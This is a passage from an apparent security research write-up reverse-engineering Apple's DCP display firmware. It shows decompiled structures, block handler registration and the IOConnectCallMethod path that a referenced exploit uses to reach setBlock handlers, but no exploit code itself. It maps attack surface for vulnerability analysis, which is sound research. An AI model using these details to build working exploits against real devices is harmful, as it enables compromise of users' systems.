 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;__attribute__</span><span class="HovzfPYjjR-c1">((</span><span class="HovzfPYjjR-c0">aligned</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c4">8</span><span class="HovzfPYjjR-c1">)))</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;metadispatcher</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t address_of_some_zerofill_static_buffer</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t some_flags</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;__int64 </span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__fastcall </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">dispatcher_fptr</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;metadispatcher </span><span class="HovzfPYjjR-c1">*,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*,</span><span class="HovzfPYjjR-c0">&nbsp;__int64</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;_QWORD</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t offset_of_something_which_looks_serialization_related</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;block_handler_holder </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">handlers_holder</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t structure_input_buffer</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t structure_input_size</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint32_t cnt_remaining_sclar_input</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">};</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">That metadispatcher object is then passed to this method:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.9e3136a3d4346cb21c1c8dc0948c6e7439c8fc5f"></a><a id="t.14"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;metadispatch</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">holder</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">1</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;caller_task_ptr</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">metadisp</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">In there we reach this code:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.b1eaf3e2e954d8f37bc987b98c30e92ce161e849"></a><a id="t.15"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; block_type_handler </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;lookup_a_handler_for_block_type_and_subtype</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;a1</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c30">// block_type</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;a3</span><span class="HovzfPYjjR-c1">);</span><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c30">// subtype</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The exploit calls this </span><span class="HovzfPYjjR-c7">set_block</span><span>&nbsp;external method twice, passing two different values for </span><span class="HovzfPYjjR-c7">first_scalar_input</span><span>, </span><span class="HovzfPYjjR-c7">7</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">19</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">. Here we can see that those correspond to looking up two different block handler objects here.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The lookup function searches a linked list of block handler structures; the head of the list is stored at offset </span><span class="HovzfPYjjR-c7">0x1448</span><span>&nbsp;in the </span><span class="HovzfPYjjR-c7">UPPipeDCP_H13P</span><span>&nbsp;object and registered dynamically by a method I've named </span><span class="HovzfPYjjR-c7">add_handler_for_block_type</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.0dbaa54d4462638b9beda378f3267a7a7c4ded25"></a><a id="t.16"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">add_handler_for_block_type</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;block_handler_holder </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">handler_list</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">handler</span><span class="HovzfPYjjR-c1">)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The logging code tells us that this is in a file called </span><span class="HovzfPYjjR-c7">IOMFBBlockManager.cpp</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">. IDA finds 44 cross-references to this method, indicating that there are probably that many different block handlers. The structure of each registered block handler is something like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.3c5d4c46eb785d82b4debfb43373bde140bc52fe"></a><a id="t.17"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;__cppobj </span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">:</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;RTKIT_RC_RTTI_BASE</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t field_16</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;handler_inner_types_entry </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">inner_types_array</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t n_inner_types_array_entries</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t field_36</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint8_t can_run_without_commandgate</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t block_type</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t list_link</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t list_other_link</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t some_other_type_field</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t some_other_type_field2</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t expected_structure_io_size</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t field_76</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t getBlock_Impl</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t setBlock_Impl</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t field_96</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint64_t back_ptr_to_UPPipeDCP_H13P</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">};</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The RTTI type is </span><span class="HovzfPYjjR-c7">BLHA</span><span>&nbsp;(</span><span class="HovzfPYjjR-c7">BL</span><span>ock </span><span class="HovzfPYjjR-c7">HA</span><span>ndler.)</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">For example, here's the codepath which builds and registers block handler type 24:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.15a6e240c53ab46ec843eed2902a63a7ce3a078d"></a><a id="t.18"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*)</span><span class="HovzfPYjjR-c14">CXXnew</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c4">112LL</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">__vftable </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c14">BlockHandler_vtbl</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*)</span><span class="HovzfPYjjR-c0">BLHA_super_vtable</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">block_type </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">24</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">refcnt </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">1</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">can_run_without_commandgate </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">some_other_type_field </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">expected_structure_io_size </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0xD20</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">typeid</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;typeid_BLHA</span><span class="HovzfPYjjR-c1">();</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c9">typeid</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">typeid</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">modify_typeid_ref</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">typeid</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">1</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">__vftable </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;vtable_BLHA_subclass_type_24</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">inner_types_array </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">n_inner_types_array_entries </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">getBlock_Impl </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;BLHA_24_getBlock_Impl</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">setBlock_Impl </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;BLHA_24_setBlock_Impl</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">field_96 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">BLHA_24</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">back_ptr_to_UPPipeDCP_H13P </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;a1</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">add_handler_for_block_type</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">list_holder</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;BLHA_24</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Each block handler optionally has </span><span class="HovzfPYjjR-c7">getBlock_Impl</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;function pointers which appear to implement the actual setting and getting operations.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>We can go through all the callsites which add block handlers; tell IDA the type of the arguments and name all the </span><span class="HovzfPYjjR-c7">getBlock</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">setBlock</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;implementations:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><img /></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Z34Qgm9fUE2rzMwJWQ3j-w7InvtfHj5fs2qctSh0tTFmMbUpnrsQC4rUrhMf3_83uHAFinlM6xKqKXgUc2QR5IfL0gf4YEBM9Rqgrc6sNYsaCZ-JAe0PHlGa9VYcBgWfTqj5rTtin1mWTDG-I8K5M41EhA64KLNV54Sv9lvtbYIrkY2j37X6SniB/s1436/Screenshot%202022-06-22%20at%2016.53.47.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="The IDA Pro Names window showing a list of symbols like BLHA_15_getBlock_Impl." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Z34Qgm9fUE2rzMwJWQ3j-w7InvtfHj5fs2qctSh0tTFmMbUpnrsQC4rUrhMf3_83uHAFinlM6xKqKXgUc2QR5IfL0gf4YEBM9Rqgrc6sNYsaCZ-JAe0PHlGa9VYcBgWfTqj5rTtin1mWTDG-I8K5M41EhA64KLNV54Sv9lvtbYIrkY2j37X6SniB/s1200/Screenshot%202022-06-22%20at%2016.53.47.png" style="max-height: 750; max-width: 600px;" title="The IDA Pro Names window showing a list of symbols like BLHA_15_getBlock_Impl." /></a></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>You can perhaps see where this is going: that's looking like really quite a lot of reachable attack surface! Each of those </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span>&nbsp;functions is reachable by passing a different value for the first scalar argument to </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span>&nbsp;</span><span class="HovzfPYjjR-c7">78</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>There's a little bit more reversing though to figure out how exactly to get controlled bytes to those </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;functions:</span></p><h2 class="HovzfPYjjR-c8 HovzfPYjjR-c15" id="h.7aa6aljwlb56"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Memory Mapping</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The raw "block" input to each of those </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span>&nbsp;methods isn't passed inline in the </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span>&nbsp;structure input. There's another level of indirection: each individual block handler structure has an array of supported "subtypes" which contains metadata detailing where to find the (userspace) pointer to that subtype's input data in the </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;structure input. The first dword in the structure input is the id of this subtype - in this case for the block handler type 19 the metadata array has a single entry:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&lt;2, 0, 0x5F8, 0x600&gt;</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The first value (</span><span class="HovzfPYjjR-c7">2</span><span>) is the subtype id and </span><span class="HovzfPYjjR-c7">0x5f8</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">0x600</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;tell the DCP from what offset in the structure input data to read a pointer and size from. The DCP then requests a memory mapping from the AP for that memory from the calling task:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.aba9dc90c6ed53b6789430b30f81bcfaea4d57c4"></a><a id="t.19"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;wrap_MemoryDescriptor</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">withAddressRange</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">structure_input_buffer </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;addr_offset</span><span class="HovzfPYjjR-c1">),</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">structure_input_buffer </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;size_offset</span><span class="HovzfPYjjR-c1">),</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; caller_task_ptr</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>We saw earlier that the AP sends the DCP the </span><span class="HovzfPYjjR-c7">struct task</span><span>&nbsp;pointer of the calling task; when the DCP requests a memory mapping from a user task it sends those raw task struct pointers back to the AP such that the kernel can perform the mapping from the correct task. The memory mapping is abstracted as an </span><span class="HovzfPYjjR-c7">MDES</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;object on the DCP side; the implementation of the mapping involves the DCP making an RPC to the AP:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.3170af9bf4e5590254e3fb8ce48d68439d2d1c04"></a><a id="t.20"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">make_link_call</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c22">'D453'</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">req</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x20</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">resp</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x14</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">which corresponds to a call to this method on the AP side:</span></p>
